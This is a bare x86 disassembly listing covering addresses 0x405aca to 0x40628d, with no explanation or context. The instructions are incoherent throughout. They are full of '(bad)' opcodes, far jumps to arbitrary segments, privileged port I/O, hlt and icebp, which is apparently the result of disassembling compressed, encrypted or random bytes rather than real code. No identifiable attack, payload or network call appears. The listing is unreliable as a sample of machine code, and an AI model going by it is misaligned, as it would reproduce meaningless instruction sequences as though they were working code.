  405aca:	arpl   WORD PTR [ebp-0x5f193f8a],sp
  405ad0:	or     esi,0xffffff99
  405ad3:	call   FWORD PTR [eax+0x3725b9d7]
  405ad9:	arpl   si,bp
  405adb:	bound  edi,QWORD PTR [edi]
  405add:	adc    esi,DWORD PTR ds:0x79dd7f51
  405ae3:	fwait
  405ae4:	xchg   edi,eax
  405ae5:	push   es
  405ae6:	add    DWORD PTR [edi-0x61ca054f],ebp
  405aec:	sar    BYTE PTR [edi],cl
  405aee:	shr    BYTE PTR [edx+0x72],cl
  405af1:	aam    0xf8
  405af3:	xor    ecx,DWORD PTR [eax+0x39]
  405af6:	inc    esp
  405af7:	or     eax,0x86ad0aaf
  405afc:	adc    dl,ah
  405afe:	or     BYTE PTR [edi],dh
  405b00:	adc    ah,bl
  405b02:	(bad)  
  405b04:	int3   
  405b05:	xchg   ecx,eax
  405b06:	xchg   DWORD PTR [ebp-0x3af292d8],ebx
  405b0c:	push   edx
  405b0d:	arpl   ax,si
  405b0f:	into   
  405b10:	jae    0x405ab4
  405b12:	jmp    0x52a2:0x2d21525b
  405b19:	outs   dx,BYTE PTR ds:[esi]
  405b1a:	xor    ebx,esp
  405b1c:	rol    eax,cl
  405b1e:	outs   dx,DWORD PTR ds:[esi]
  405b1f:	loopne 0x405ad6
  405b21:	jo     0x405b27
  405b23:	fdiv   DWORD PTR [ebp+0x1f]
  405b26:	pushf  
  405b27:	ss xchg esp,eax
  405b29:	out    dx,eax
  405b2a:	fisub  DWORD PTR [ecx-0x350be797]
  405b30:	xor    eax,0x8318ca0f
  405b35:	lahf   
  405b36:	and    al,0x1f
  405b38:	pop    ebx
  405b39:	mov    edx,0x4f740bf8
  405b3e:	(bad)  
  405b40:	icebp  
  405b41:	dec    ebx
  405b42:	mov    bl,0xf8
  405b44:	xchg   DWORD PTR [ebx],esp
  405b46:	xchg   ecx,eax
  405b47:	jo     0x405bc2
  405b49:	retf   
  405b4a:	cmp    eax,0x725638b9
  405b4f:	add    bh,BYTE PTR [ebp-0x5c40f3d4]
  405b55:	push   esi
  405b56:	or     BYTE PTR gs:[edi+edi*1-0x1d9352ab],ch
  405b5e:	xchg   DWORD PTR [esi-0x7a],esi
  405b61:	jmp    0x4a18:0xd8c51b0d
  405b68:	add    esi,esp
  405b6a:	fadd   QWORD PTR [edi-0x1f]
  405b6d:	fstp   TBYTE PTR [eax-0x35]
  405b70:	mov    dl,0x82
  405b72:	pop    eax
  405b73:	inc    ebp
  405b74:	ret    0x934f
  405b77:	rcr    DWORD PTR [esi+0x7ee4d55b],1
  405b7d:	and    ah,ah
  405b7f:	das    
  405b80:	mov    al,ds:0x2dd228ed
  405b85:	(bad)  
  405b86:	and    eax,0xad78899c
  405b8b:	lods   eax,DWORD PTR ds:[esi]
  405b8c:	mov    cl,BYTE PTR [edi+ebx*1]
  405b8f:	hlt    
  405b90:	int3   
  405b91:	je     0x405b9a
  405b93:	pop    ecx
  405b94:	faddp  st(1),st
  405b96:	add    al,0x3d
  405b98:	push   cs
  405b99:	add    al,BYTE PTR [edx]
  405b9b:	fstp   TBYTE PTR [ecx+0x18364b6d]
  405ba1:	xchg   ecx,eax
  405ba2:	mov    esi,0xdcd090df
  405ba7:	sub    al,ch
  405ba9:	jle    0x405b38
  405bab:	mov    ds:0x9408b34,eax
  405bb0:	repnz fadd QWORD PTR [eax+esi*4]
  405bb4:	and    esp,DWORD PTR [edx-0x70fe6e2b]
  405bba:	sub    DWORD PTR [esi-0x78],ebx
  405bbd:	lock mov dl,0x7f
  405bc0:	mov    ebp,0xcb312c12
  405bc5:	pushf  
  405bc6:	inc    edx
  405bc7:	fwait
  405bc8:	mov    al,BYTE PTR [ebx-0x52]
  405bcb:	mov    al,ds:0x32af2b25
  405bd0:	jno    0x405c2e
  405bd2:	add    BYTE PTR [ebp+0x6d],0x20
  405bd6:	popf   
  405bd7:	leave  
  405bd8:	retf   
  405bd9:	fcom   DWORD PTR [ecx-0x56c3490]
  405bdf:	jl     0x405be5
  405be1:	push   si
  405be3:	cmp    al,0x80
  405be5:	lods   al,BYTE PTR ds:[esi]
  405be6:	mov    ch,0x65
  405be8:	in     eax,dx
  405be9:	mov    edx,0x76dc5ba6
  405bee:	mov    al,0x18
  405bf0:	test   al,0x6a
  405bf2:	pop    edx
  405bf3:	jae    0x405b92
  405bf5:	fadd   st,st(5)
  405bf7:	aas    
  405bf8:	dec    esi
  405bf9:	retf   0x79b0
  405bfc:	mov    edx,0x6a533fea
  405c01:	je     0x405c62
  405c03:	xor    al,0x8
  405c05:	aam    0xbe
  405c07:	sbb    al,0xdf
  405c09:	xor    DWORD PTR [ebp+0x2e],esp
  405c0c:	jmp    0x22a:0x5aca669f
  405c13:	jge    0x405c4b
  405c15:	div    BYTE PTR [eax]
  405c17:	push   edx
  405c18:	mov    WORD PTR [ecx],?
  405c1a:	mov    ecx,0xf1ab3ad5
  405c1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c21:	aad    0xda
  405c23:	mov    WORD PTR ds:[ebx],?
  405c26:	xor    DWORD PTR [edx+edi*4+0x2b],ecx
  405c2a:	(bad)  
  405c2b:	(bad)  
  405c2c:	push   cs
  405c2d:	(bad)
  405c30:	ficomp DWORD PTR [edi]
  405c32:	(bad)  
  405c33:	ins    DWORD PTR es:[edi],dx
  405c34:	loopne 0x405bdf
  405c36:	js     0x405c8e
  405c38:	fdivr  DWORD PTR [ecx-0x20]
  405c3b:	(bad)  
  405c3c:	ins    DWORD PTR es:[edi],dx
  405c3d:	in     eax,dx
  405c3e:	inc    esp
  405c3f:	mov    DWORD PTR [edi],ecx
  405c41:	in     al,dx
  405c42:	bound  esi,QWORD PTR [eax-0x48]
  405c45:	add    al,BYTE PTR [eax+eax*4+0x10]
  405c49:	xor    DWORD PTR [eax-0x2fd22709],ebp
  405c4f:	adc    eax,0x2e16ee3c
  405c54:	out    dx,al
  405c55:	sub    BYTE PTR [ecx],0x8
  405c58:	add    ah,ch
  405c5a:	mov    esi,cs
  405c5c:	mov    esp,0x1654fdf5
  405c61:	idiv   edi
  405c63:	aad    0xf3
  405c65:	add    esp,eax
  405c67:	js     0x405c30
  405c69:	fdiv   st(1),st
  405c6b:	add    esp,DWORD PTR [esi+eiz*2]
  405c6e:	dec    ebp
  405c6f:	popa   
  405c70:	inc    eax
  405c71:	jl     0x405cf1
  405c73:	mov    ebp,0xe5ff748e
  405c78:	nop
  405c79:	lahf   
  405c7a:	push   eax
  405c7b:	mov    ebp,0x65193ed9
  405c80:	mov    al,ds:0x851989b
  405c85:	retf   
  405c86:	dec    esp
  405c87:	aam    0x56
  405c89:	mov    cl,BYTE PTR [ebx]
  405c8b:	(bad)
  405c8f:	dec    edi
  405c90:	enter  0x6823,0x7a
  405c94:	test   DWORD PTR [edx],ebx
  405c96:	xlat   BYTE PTR ds:[ebx]
  405c97:	pop    ds
  405c98:	nop
  405c99:	dec    ecx
  405c9a:	inc    ebp
  405c9b:	jecxz  0x405c68
  405c9d:	shl    al,1
  405c9f:	pop    eax
  405ca0:	ficom  WORD PTR [ebp-0x2e]
  405ca3:	dec    ebx
  405ca4:	(bad)  
  405ca5:	icebp  
  405ca6:	out    dx,al
  405ca7:	cmc    
  405ca8:	xlat   BYTE PTR ds:[ebx]
  405ca9:	mov    WORD PTR [ecx+ecx*8],ds
  405cac:	dec    edx
  405cad:	sbb    al,0x24
  405caf:	cwde   
  405cb0:	cld    
  405cb1:	in     al,0xf
  405cb3:	dec    ebx
  405cb4:	outs   dx,DWORD PTR ds:[esi]
  405cb5:	cmc    
  405cb6:	std    
  405cb7:	int    0x32
  405cb9:	aam    0x66
  405cbb:	outs   dx,BYTE PTR ds:[esi]
  405cbc:	sbb    BYTE PTR [ecx+0x5d588735],dl
  405cc2:	add    BYTE PTR [edi+ecx*4-0x1a],0x16
  405cc7:	scas   eax,DWORD PTR es:[edi]
  405cc8:	cmc    
  405cc9:	imul   ecx,DWORD PTR [ebp+0x4b],0x1115c5d7
  405cd0:	inc    ebp
  405cd1:	mov    dl,0x8
  405cd3:	push   cs
  405cd4:	loop   0x405cb2
  405cd6:	ds clc 
  405cd8:	jo     0x405d2a
  405cda:	push   es
  405cdb:	dec    ecx
  405cdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cdd:	js     0x405ce0
  405cdf:	sub    edi,ebx
  405ce1:	hlt    
  405ce2:	ret    
  405ce3:	and    bh,BYTE PTR [ebp+0x46b0cd2b]
  405ce9:	jne    0x405c7f
  405ceb:	pop    esp
  405cec:	dec    ecx
  405ced:	xchg   edi,eax
  405cee:	sub    bl,dh
  405cf0:	stc    
  405cf1:	inc    esi
  405cf2:	inc    esi
  405cf3:	jle    0x405c91
  405cf5:	out    dx,al
  405cf6:	mov    al,0xc9
  405cf8:	mov    bl,0x61
  405cfa:	lock ss ret 0x9424
  405cff:	imul   esp,DWORD PTR [ebp-0x12],0x4c
  405d03:	mov    ebx,0x3ad5ef22
  405d08:	inc    esi
  405d09:	pop    esi
  405d0a:	popa   
  405d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d0c:	in     eax,dx
  405d0d:	cmp    ah,BYTE PTR [ebx+0x15bab18e]
  405d13:	(bad)  
  405d14:	out    0x29,eax
  405d16:	sub    cl,BYTE PTR [edi+0x32]
  405d19:	xchg   DWORD PTR [esi],ecx
  405d1b:	ficomp WORD PTR [eax+0x117c929f]
  405d21:	mov    ds:0x278a1ab6,eax
  405d26:	aam    0xcb
  405d28:	dec    ecx
  405d29:	mov    edx,0xf79aa65d
  405d2e:	dec    edx
  405d2f:	xchg   edi,eax
  405d30:	in     eax,0x21
  405d32:	loope  0x405cdf
  405d34:	je     0x405d31
  405d36:	fisttp WORD PTR [ebp+0x5221c9a0]
  405d3c:	cdq    
  405d3d:	lea    edi,[esi]
  405d3f:	xor    DWORD PTR [ebx+0x1b],edi
  405d42:	fistp  DWORD PTR ds:0x4e5daac9
  405d48:	ret    0x8192
  405d4b:	sahf   
  405d4c:	cmovb  edx,DWORD PTR [ebx-0x5aab3198]
  405d53:	mov    DWORD PTR [edi],ebp
  405d55:	xchg   ebp,eax
  405d56:	mov    ds:0x21c349bd,al
  405d5b:	add    al,0xfb
  405d5d:	dec    esi
  405d5e:	jl     0x405dc5
  405d60:	adc    ebx,0xffffff85
  405d63:	ss xchg esi,eax
  405d65:	loop   0x405d40
  405d67:	popa   
  405d68:	(bad)  
  405d69:	sub    ch,bh
  405d6b:	jo     0x405d2f
  405d6d:	repnz xor al,0xd4
  405d70:	pop    ebx
  405d71:	mov    eax,0xba3b7558
  405d76:	or     al,0x23
  405d78:	cmp    al,0xd
  405d7a:	xchg   ebp,eax
  405d7b:	jge    0x405dc1
  405d7d:	xchg   edx,eax
  405d7e:	mov    es:0x1f56ee4e,eax
  405d84:	and    bh,BYTE PTR [esi+ebx*1]
  405d87:	scas   eax,DWORD PTR es:[edi]
  405d88:	jnp    0x405d6e
  405d8a:	dec    ebp
  405d8b:	mov    ch,0x3d
  405d8d:	inc    ebx
  405d8e:	(bad)  
  405d90:	xchg   ecx,eax
  405d91:	shl    DWORD PTR fs:[ebp+0x70e8646c],cl
  405d98:	and    al,0xc2
  405d9a:	pop    ecx
  405d9b:	push   ecx
  405d9c:	test   DWORD PTR [ecx-0x7eccbf7e],0xa4034f14
  405da6:	(bad)  
  405da7:	fucomp st(7)
  405da9:	jnp    0x405d2b
  405dab:	int    0x1f
  405dad:	push   eax
  405dae:	shl    DWORD PTR [ecx],cl
  405db0:	or     BYTE PTR [ecx-0x7a322aa5],bh
  405db6:	jno    0x405d5d
  405db8:	(bad)  
  405db9:	mov    ?,WORD PTR [eax]
  405dbb:	adc    al,al
  405dbd:	(bad)  
  405dbe:	sbb    eax,0x228b4e6e
  405dc3:	adc    al,BYTE PTR [edi-0x9dcf30a]
  405dc9:	shl    ecx,0xd7
  405dcc:	aas    
  405dcd:	sahf   
  405dce:	in     ax,0x4c
  405dd1:	ins    BYTE PTR es:[edi],dx
  405dd2:	sbb    eax,0xf7d07320
  405dd7:	and    BYTE PTR [ecx-0x5357d29e],bl
  405ddd:	inc    ebp
  405dde:	push   ebx
  405ddf:	add    eax,DWORD PTR [ebp-0x17875abd]
  405de5:	push   ebx
  405de6:	icebp  
  405de7:	adc    eax,0x514b887c
  405dec:	or     BYTE PTR [edi-0x75],dh
  405def:	mov    al,0x2f
  405df1:	ss sub eax,0x73aa8f90
  405df7:	push   cs
  405df8:	xor    BYTE PTR [esi],bh
  405dfa:	add    BYTE PTR [esi+ebx*8+0x4c],al
  405dfe:	mov    esp,0xb217ff69
  405e03:	and    al,0x14
  405e05:	in     al,dx
  405e06:	icebp  
  405e07:	cmp    al,0xea
  405e09:	(bad)  
  405e0a:	outs   dx,DWORD PTR ds:[esi]
  405e0b:	push   cs
  405e0c:	xlat   BYTE PTR ds:[ebx]
  405e0d:	fsub   QWORD PTR [ecx-0x29d55ba4]
  405e13:	cmc    
  405e14:	push   esp
  405e15:	xor    BYTE PTR [edi],ah
  405e17:	lds    ebx,FWORD PTR [si+0x49]
  405e1b:	mov    esp,0xe9ca8893
  405e20:	loopne 0x405e33
  405e22:	mov    BYTE PTR [edi+0x42958334],bl
  405e28:	in     eax,dx
  405e29:	add    al,0x25
  405e2b:	add    edx,ebp
  405e2d:	cmp    esi,DWORD PTR [ebx]
  405e2f:	mov    ebx,0x6adeacea
  405e34:	imul   esi,DWORD PTR [edx],0x24
  405e37:	dec    esi
  405e38:	push   esp
  405e39:	inc    edx
  405e3a:	add    DWORD PTR [edx],esp
  405e3c:	je     0x405df5
  405e3e:	push   ecx
  405e3f:	add    DWORD PTR [ecx],esp
  405e41:	stos   BYTE PTR es:[edi],al
  405e42:	scas   eax,DWORD PTR es:[edi]
  405e43:	loop   0x405ea9
  405e45:	call   FWORD PTR [esi]
  405e47:	jp     0x405ddf
  405e49:	pop    es
  405e4a:	xchg   BYTE PTR ds:0x4b2afc0,bh
  405e50:	cli    
  405e51:	xchg   esp,eax
  405e52:	enter  0x7794,0x4f
  405e56:	mov    bl,BYTE PTR [ebp-0x1e29245f]
  405e5c:	add    eax,0xc314eb4e
  405e61:	sbb    BYTE PTR [edx],cl
  405e63:	fistp  QWORD PTR [ebx]
  405e65:	loop   0x405ee1
  405e67:	pop    ebx
  405e68:	dec    edi
  405e69:	out    0xea,al
  405e6b:	jae    0x405e01
  405e6d:	inc    edx
  405e6e:	arpl   WORD PTR [edx],sp
  405e70:	int3   
  405e71:	push   ebx
  405e72:	mov    edx,DWORD PTR [ebp-0x7b297a14]
  405e78:	out    0x2c,eax
  405e7a:	daa    
  405e7b:	fdiv   st,st(6)
  405e7d:	leave  
  405e7e:	ds xchg ebx,eax
  405e80:	mov    edi,0x1756418e
  405e85:	mov    ch,BYTE PTR [edx+0x60]
  405e88:	int3   
  405e89:	cmp    eax,0x6f48c683
  405e8e:	adc    bh,al
  405e90:	pop    ebp
  405e91:	xchg   ebx,eax
  405e92:	sahf   
  405e93:	add    al,0xe1
  405e95:	xchg   bx,ax
  405e97:	adc    al,0xe7
  405e99:	cli    
  405e9a:	aam    0xec
  405e9c:	push   cs
  405e9d:	fsub   st,st(3)
  405e9f:	mov    edi,DWORD PTR [eax+0x4b]
  405ea2:	push   ds
  405ea3:	shr    BYTE PTR [esi+0x2b],0x5d
  405ea7:	pop    ds
  405ea8:	cmp    al,dh
  405eaa:	call   0x2002:0xda7d3ac
  405eb1:	push   ecx
  405eb2:	cdq    
  405eb3:	loopne 0x405e3b
  405eb5:	xor    cl,dl
  405eb7:	sub    DWORD PTR [ebx+ebp*2-0x6],esi
  405ebb:	xor    BYTE PTR [esi-0x56f3d675],cl
  405ec1:	imul   ecx,DWORD PTR [ecx],0x5b94bd62
  405ec7:	adc    al,BYTE PTR [eax+0x62b460ef]
  405ecd:	jmp    0xe843:0x499f8534
  405ed4:	xchg   edi,eax
  405ed5:	jmp    0x405edc
  405ed7:	in     eax,0x6f
  405ed9:	mov    ecx,0xf150e6d4
  405ede:	jp     0x405ec3
  405ee0:	jo     0x405e8c
  405ee2:	inc    esp
  405ee3:	(bad)  
  405ee5:	jmp    0x405ea9
  405ee7:	mov    ebx,0x43764f20
  405eec:	out    dx,eax
  405eed:	jmp    0x405e96
  405eef:	mov    edi,0xac729bde
  405ef4:	lds    esi,FWORD PTR [esi-0x1149778d]
  405efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405efb:	mov    bl,0xc3
  405efd:	mov    ebx,0x66cafaab
  405f02:	mov    dl,0xb
  405f04:	(bad)  
  405f05:	jle    0x405eca
  405f07:	mov    ebx,0x4395dda
  405f0c:	out    dx,eax
  405f0d:	in     al,0x2f
  405f0f:	icebp  
  405f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f11:	in     al,0xb6
  405f13:	mov    ds:0xc2b08ea,eax
  405f18:	(bad)  
  405f19:	retf   
  405f1a:	inc    esi
  405f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f1c:	aam    0xa4
  405f1e:	je     0x405f8a
  405f20:	rcr    DWORD PTR [edx+0x260d6d00],cl
  405f26:	pop    ss
  405f27:	sub    DWORD PTR ds:0x81a7f36d,eax
  405f2d:	retf   
  405f2e:	xor    al,0xba
  405f30:	ja     0x405eed
  405f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f33:	jecxz  0x405f70
  405f35:	and    al,0xe6
  405f37:	xor    BYTE PTR [ebx+eiz*4+0x7c],ch
  405f3b:	les    ecx,FWORD PTR [ebp-0x51]
  405f3e:	mov    cl,BYTE PTR [ecx+0x7817b975]
  405f44:	test   DWORD PTR [edx],eax
  405f46:	and    ah,BYTE PTR [eax+0x3b]
  405f49:	adc    BYTE PTR [ecx+0x21],0x6d
  405f4d:	and    BYTE PTR [eax+0x43],cl
  405f50:	fild   WORD PTR [ecx+0x25a37bb8]
  405f56:	jmp    0xe48e:0x6b2b4b38
  405f5d:	(bad)  
  405f5e:	out    0x37,al
  405f60:	cmp    dl,BYTE PTR [ebx+0x73618f01]
  405f66:	inc    ebx
  405f67:	cs popa 
  405f69:	ret    
  405f6a:	cwde   
  405f6b:	fwait
  405f6c:	sbb    DWORD PTR [ecx-0x53b05f47],eax
  405f72:	mov    al,ds:0x269e2df5
  405f77:	jmp    0x5996:0x2ab07677
  405f7e:	jmp    0xd26f:0xe387e5e8
  405f85:	fadd   QWORD PTR [ecx]
  405f87:	jae    0x405f26
  405f89:	outs   dx,DWORD PTR ds:[esi]
  405f8a:	ret    
  405f8b:	aaa    
  405f8c:	add    DWORD PTR [edx+esi*2+0x4e6390a9],esi
  405f93:	push   ss
  405f94:	xchg   edx,eax
  405f95:	mov    eax,ds:0xe5311fdc
  405f9a:	lds    esi,FWORD PTR [ebx-0x71]
  405f9d:	and    eax,0x4390aad3
  405fa2:	adc    eax,0xb6fdceb3
  405fa7:	mov    dh,0x68
  405fa9:	pop    ecx
  405faa:	xchg   edx,eax
  405fab:	jle    0x405f33
  405fad:	inc    eax
  405fae:	dec    ebx
  405faf:	sbb    ch,ch
  405fb1:	pop    ebx
  405fb2:	pop    ss
  405fb3:	xlat   BYTE PTR ds:[ebx]
  405fb4:	and    al,0x6d
  405fb6:	cdq    
  405fb7:	adc    BYTE PTR [ebx+ecx*8+0x46815e9a],bl
  405fbe:	push   edi
  405fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fc0:	pop    ds
  405fc1:	sub    eax,0x7220c721
  405fc6:	xchg   BYTE PTR [ebx],bl
  405fc8:	jbe    0x405f6b
  405fca:	or     bh,0xec
  405fcd:	(bad)  
  405fce:	sbb    BYTE PTR [ebp+0x502f99d4],ah
  405fd4:	sub    al,0x7b
  405fd6:	cmp    eax,0xa2b53ffe
  405fdb:	int    0xbf
  405fdd:	mov    ah,BYTE PTR [ecx-0x396e1f78]
  405fe3:	mul    BYTE PTR [ebx-0x73]
  405fe6:	or     dh,BYTE PTR [ebp-0x1f]
  405fe9:	dec    ebx
  405fea:	xlat   BYTE PTR ds:[ebx]
  405feb:	movlps xmm7,QWORD PTR [ebx+0x6867d74a]
  405ff2:	mov    ah,0x2e
  405ff4:	addr16 add al,0xb5
  405ff7:	inc    ecx
  405ff8:	into   
  405ff9:	push   ebx
  405ffa:	psubsw mm2,mm6
  405ffd:	pop    edi
  405ffe:	adc    al,0x9
  406000:	xor    DWORD PTR ds:0x9964e2c3,esi
  406006:	jl     0x405fa0
  406008:	and    BYTE PTR [eax+ebx*4],ch
  40600b:	loope  0x405fd8
  40600d:	dec    esi
  40600e:	stos   DWORD PTR es:[edi],eax
  40600f:	sbb    esp,esi
  406011:	dec    esp
  406012:	or     eax,0xdd54bd11
  406017:	push   0x73
  406019:	push   edi
  40601a:	push   ecx
  40601b:	jo     0x405fe2
  40601d:	add    BYTE PTR [esi+0x1d85348b],cl
  406023:	sbb    ch,ah
  406025:	mov    ds:0xfcae7e8b,al
  40602a:	cli    
  40602b:	out    dx,eax
  40602c:	sbb    DWORD PTR [eax+0x11],esp
  40602f:	popf   
  406030:	pop    esp
  406031:	xor    eax,0x24f2f79a
  406036:	cmp    DWORD PTR [esi+0x538f4fa2],0xb
  40603d:	div    DWORD PTR [esp+ecx*8+0x3b947861]
  406044:	add    al,0x5
  406046:	int    0x44
  406048:	xlat   BYTE PTR ds:[ebx]
  406049:	fisub  WORD PTR [edx-0x1fdf2207]
  40604f:	data16 sbb dl,0x4c
  406053:	out    dx,eax
  406054:	test   dl,dh
  406056:	jge    0x4060ac
  406058:	jno    0x406070
  40605a:	iret   
  40605b:	dec    ecx
  40605c:	fld    st(7)
  40605e:	dec    esp
  40605f:	xchg   ebx,eax
  406060:	sub    edx,DWORD PTR [ecx]
  406062:	pop    es
  406063:	jne    0x4060da
  406065:	mov    BYTE PTR [eax],ch
  406067:	xor    dl,BYTE PTR [esi+edi*1]
  40606a:	mov    eax,0xdc19c72f
  40606f:	or     eax,0xa7a41260
  406074:	bound  esp,QWORD PTR [edx]
  406076:	(bad)  
  406077:	lea    esp,[eax+0x3b]
  40607a:	cmp    edi,DWORD PTR [esi+esi*1-0x5b63743f]
  406081:	lds    edx,FWORD PTR [edx-0x1d]
  406084:	cld    
  406085:	daa    
  406086:	clc    
  406087:	js     0x40607b
  406089:	jge    0x406048
  40608b:	jae    0x4060e4
  40608d:	(bad)
  406090:	js     0x40602d
  406092:	mov    esp,DWORD PTR [ecx+0xa332529]
  406098:	dec    ebx
  406099:	xor    edi,esi
  40609b:	dec    esi
  40609c:	test   BYTE PTR [edx-0x57],ch
  40609f:	pop    esp
  4060a0:	cmp    dl,BYTE PTR ds:0x33a89dd6
  4060a6:	mov    ds:0x1eeff77f,al
  4060ab:	out    dx,eax
  4060ac:	fwait
  4060ad:	mov    edi,0xce6239c3
  4060b2:	leave  
  4060b3:	shl    DWORD PTR [ebx+ecx*4-0x5a],0x53
  4060b8:	mov    dh,0x64
  4060ba:	adc    al,0xe9
  4060bc:	pop    eax
  4060bd:	mov    eax,DWORD PTR [edi]
  4060bf:	js     0x40605a
  4060c1:	cmp    DWORD PTR es:[ecx+ecx*1],0x32
  4060c6:	call   0x3dc1:0xbde57090
  4060cd:	iret   
  4060ce:	xor    ebp,DWORD PTR [esi]
  4060d0:	out    0xaf,al
  4060d2:	test   BYTE PTR [ecx-0x54],0x3
  4060d6:	out    dx,eax
  4060d7:	popa   
  4060d8:	sub    al,0x18
  4060da:	and    dh,BYTE PTR [ebx+0x45d28851]
  4060e0:	dec    ebp
  4060e1:	(bad)  
  4060e2:	dec    esi
  4060e3:	mov    fs,WORD PTR [esp+edx*1-0x6ee524dc]
  4060ea:	jne    0x40608a
  4060ec:	xor    BYTE PTR [ecx],dh
  4060ee:	pop    ebp
  4060ef:	icebp  
  4060f0:	imul   edx,DWORD PTR [edx+0x11],0x47
  4060f4:	add    BYTE PTR fs:[esi+ebx*1],ch
  4060f8:	into   
  4060f9:	popa   
  4060fa:	mov    ds,WORD PTR [esi+ecx*2-0x35]
  4060fe:	aad    0x39
  406100:	popa   
  406101:	mov    al,0x88
  406103:	enter  0xf7a5,0x57
  406107:	mov    ebx,0x48e9c36b
  40610c:	xor    DWORD PTR [eax],edi
  40610e:	or     eax,0xda6dff83
  406113:	jle    0x4060af
  406115:	and    ch,bh
  406117:	enter  0x831a,0x7f
  40611b:	stc    
  40611c:	push   ss
  40611d:	fbld   TBYTE PTR [ecx+0x3c]
  406120:	fidiv  WORD PTR [esi-0x8cf3644]
  406126:	into   
  406127:	bound  ebp,QWORD PTR [ebx-0x56]
  40612a:	pop    ecx
  40612b:	ret    
  40612c:	xor    eax,0x4e0975a4
  406131:	mov    al,BYTE PTR [edi+0x54cbd49b]
  406137:	add    BYTE PTR [edi],bh
  406139:	cdq    
  40613a:	aaa    
  40613b:	mov    al,ds:0x53c570df
  406140:	cmp    esp,eax
  406142:	jmp    0x56a0f82a
  406147:	dec    esi
  406148:	or     eax,0x96e5dc6d
  40614d:	adc    DWORD PTR [ecx-0x30],0xf7b2e2fc
  406154:	push   edi
  406155:	cwde   
  406156:	aas    
  406157:	mov    gs,WORD PTR [ebx+ebp*8]
  40615a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40615b:	fsubr  QWORD PTR [ebx+ebx*4+0x1f]
  40615f:	xor    BYTE PTR [esi-0x23324079],bh
  406165:	xchg   edx,eax
  406166:	popa   
  406167:	popa   
  406168:	xchg   ebx,eax
  406169:	or     BYTE PTR [ebp-0x6],bh
  40616c:	pop    ebp
  40616d:	add    DWORD PTR [eax],ebp
  40616f:	pop    ecx
  406170:	mov    edx,edx
  406172:	(bad)  
  406173:	in     al,0x57
  406175:	jmp    0x2642:0xecf426d5
  40617c:	jbe    0x40611e
  40617e:	stc    
  40617f:	sub    al,0x22
  406181:	xor    esp,DWORD PTR [edx]
  406183:	js     0x4061ed
  406185:	inc    ebp
  406187:	fisttp QWORD PTR [esi+0x3fcfe85]
  40618d:	mov    bl,0xf4
  40618f:	and    DWORD PTR [ebx+0x54],ebp
  406192:	sti    
  406193:	inc    edx
  406194:	pop    edx
  406195:	cmc    
  406196:	(bad)  
  406197:	pop    eax
  406198:	pop    ebx
  406199:	test   BYTE PTR [edi-0x7e],0xd7
  40619d:	out    dx,al
  40619e:	dec    ecx
  40619f:	rol    BYTE PTR [eax-0x70efe46d],0x32
  4061a6:	shl    DWORD PTR [eax-0x27],cl
  4061a9:	nop
  4061aa:	and    ecx,esi
  4061ac:	add    eax,0x3b20472f
  4061b1:	fistp  DWORD PTR gs:[esi+ebx*8]
  4061b5:	mov    bl,0x3e
  4061b7:	mov    dh,0x2f
  4061b9:	stos   DWORD PTR es:[edi],eax
  4061ba:	jo     0x406167
  4061bc:	leave  
  4061bd:	jg     0x406221
  4061bf:	mov    fs:0xa7f4e49d,al
  4061c5:	mov    dh,BYTE PTR [bx-0x66]
  4061c9:	mov    dl,0xb0
  4061cb:	imul   esp,DWORD PTR [edi-0x13985349],0x9ecbd6b2
  4061d5:	sub    ah,BYTE PTR ds:0xc574be5b
  4061db:	or     ch,ch
  4061dd:	jl     0x4061f1
  4061df:	rcr    DWORD PTR [esi+0x6b9ad82f],1
  4061e5:	stos   BYTE PTR es:[edi],al
  4061e6:	bnd js 0x406170
  4061e9:	adc    al,0xb0
  4061eb:	xchg   esp,eax
  4061ec:	imul   ecx,DWORD PTR ds:0xfa1f8796,0xd9cf9474
  4061f6:	mov    al,ds:0x4b561b4
  4061fb:	lea    edi,[ecx]
  4061fd:	mov    dl,0x67
  4061ff:	fist   WORD PTR [edx-0x19]
  406202:	dec    esp
  406203:	and    DWORD PTR [esi],esp
  406205:	ins    DWORD PTR es:[edi],dx
  406206:	pop    ecx
  406207:	cmp    al,0x50
  406209:	add    al,0x18
  40620b:	mul    DWORD PTR [esi-0x3]
  40620e:	fistp  QWORD PTR ds:0xb4e82a34
  406214:	fistp  DWORD PTR [edi-0x75]
  406217:	das    
  406218:	ins    DWORD PTR es:[edi],dx
  406219:	sub    eax,0xffffffd4
  40621c:	aam    0x8d
  40621e:	ss (bad) 
  406220:	mov    bl,ah
  406222:	pop    eax
  406223:	das    
  406224:	mov    ebx,0xd17aab75
  406229:	stos   DWORD PTR es:[edi],eax
  40622a:	repnz pop es
  40622c:	(bad)  
  40622e:	push   ds
  40622f:	add    al,0x8f
  406231:	mov    ds:0x17e135ea,al
  406236:	out    dx,al
  406237:	xor    esp,eax
  406239:	jb     0x406266
  40623b:	call   0x9bc9:0x324b9994
  406242:	jl     0x4061e9
  406244:	pop    ds
  406245:	jmp    0xbee9:0x69ee3edd
  40624c:	in     eax,0x83
  40624e:	mov    ch,0x18
  406250:	into   
  406251:	add    DWORD PTR [edi+0x257161b],esi
  406257:	mov    esi,0xfc58ee2d
  40625c:	mov    esi,0x7814189c
  406262:	and    bl,BYTE PTR [eax]
  406264:	pop    ecx
  406265:	adc    eax,0x88c14990
  40626a:	or     al,0xe7
  40626c:	xor    al,0x55
  40626e:	test   BYTE PTR [ebp+0x5cf2a310],ch
  406274:	sbb    ebp,esp
  406276:	ret    
  406277:	mov    ah,0xb3
  406279:	pushf  
  40627a:	mov    bh,0x96
  40627c:	inc    esi
  40627d:	xor    ebx,DWORD PTR [edi]
  40627f:	sbb    al,0x41
  406281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406282:	add    al,0x76
  406284:	xor    DWORD PTR [esi],esp
  406286:	dec    ebp
  406287:	cmp    al,0x2
  406289:	(bad)  
  40628a:	rol    bl,cl
  40628c:	daa    
  40628d:	pop    ds
